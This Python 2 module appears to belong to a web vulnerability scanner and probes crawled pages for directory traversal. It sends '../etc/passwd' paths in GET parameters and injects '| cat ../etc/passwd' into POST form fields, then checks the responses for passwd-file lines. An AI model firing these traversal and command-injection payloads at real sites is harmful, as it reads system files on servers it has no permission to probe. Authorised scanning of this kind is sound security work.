from crawler import Crawler
from generator import ExploitGenerator

import httplib2, urllib, urllib2, requests
from BeautifulSoup import BeautifulSoup, SoupStrainer
from urlparse import urljoin, urlparse
from helper import has_form, parse_form, get_form_action, post_request, create_get_params, create_post_params, log_results
from sets import Set

EXPLOIT_PATH = "exploits/"
EXPLOIT_TYPE = "dt"
EXPLOIT_CLASS = "Directory Traversal"


class DTModule:
    """
    DT Module
    Checks for Directory Traversal vulnerability
    """

    def __init__(self, url, pages):
        self.url = url
        self.pages = pages
        self.logs = {}

    #extract the param names from the query string 'param1=val1&param2=val2&...'
    def retrieve_params(self, params):
        result = []
        split = params.split("&")
        for x in split:
            param = x.split("=")
            result.append(param[0])

        return result

    def prepare_params(self, extracted, depth, file):
        params = self.retrieve_params(extracted)
        paths = self.prepare_paths(depth, file)

        results = []
        combined = ""
        for path in paths:
            for y in params:
                combined = y + "=" + path + "&"
            results.append(combined.rstrip("&")) #remove the last '&'
        return results

    def prepare_paths(self, depth, file):
        path = "./"
        paths = []
        for x in range(1, depth):
            path += "../"
            test = path + file
            paths.append(test)
        return paths #[./../etc/passwd , ./../../etc/passwd, ./../../../etc/passwd, ....]


    def in_cache(self, cache, string):
        result = False
        for x in cache:
            if str(x) == str(string):
                result = True
        return result

    def has_passwd_content(self, parsed_response):
        toReturn = False

        for data_line in parsed_response:
            if self.check_passwd_content_pattern(data_line):
                toReturn = True
                break

        return toReturn

    # Fed data string is checked if it consists /etc/passwd file pattern
    # Followed: https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/
    def check_passwd_content_pattern(self, data_line):
        toReturn = False

        data_line_content = data_line.split(":")

        if len(data_line_content) == 7: # '7' because the number of fields(separated by ':') in each line of content in the passwd is 7
            toReturn = True

        return toReturn

    def scan(self):

        results = []
        cache = []

        for web_page in self.pages:
            http = httplib2.Http()
            status, response = http.request(web_page)
            parsed = urlparse(web_page)

            # handle scan for get params
            if parsed.query:
                # print("testing page: " + web_page)
                payloads = self.prepare_params(parsed.query, 30, "etc/passwd")

                for payload in payloads:
                    url = parsed.scheme + "://" + parsed.hostname + parsed.path + "?" + payload
                    new_status, new_response = http.request(url)

                    parsed_response = new_response.splitlines()

                    if new_status.status == requests.codes.ok:
                        #if int(new_status['content-length']) > int(status['content-length']):
                        if self.has_passwd_content(parsed_response):
                            # print("vulnerable url: " + url + "\n")
                            if not self.in_cache(cache, url):
                                results.append((urlparse(url).path, create_get_params(url), "GET"))
                                cache.append(url)
                                break
                            break

            # handle scan for post php forms
            if has_form(response):
                forms = parse_form(response)
                action = get_form_action(response)

                if action != None:
                    web_page = web_page.rsplit('/', 1)[0] + "/" + action

                original_response = post_request(web_page, forms)
                injection_forms = []
                paths = self.prepare_paths(30, "etc/passwd")

                for path in paths:
                    for form_input in forms:
                        injection_forms.append((form_input[0], "| cat " + path))

                    new_response = post_request(web_page, injection_forms)
                    parsed_response = new_response.splitlines()
                    #if len(new_response) > len(original_response): # That means that the webpage is different, possibly a successful case
                    if self.has_passwd_content(parsed_response):
                        results.append((urlparse(web_page).path, create_post_params(injection_forms), "POST"))
                        break

        self.logs = log_results(self.url, results, EXPLOIT_CLASS)
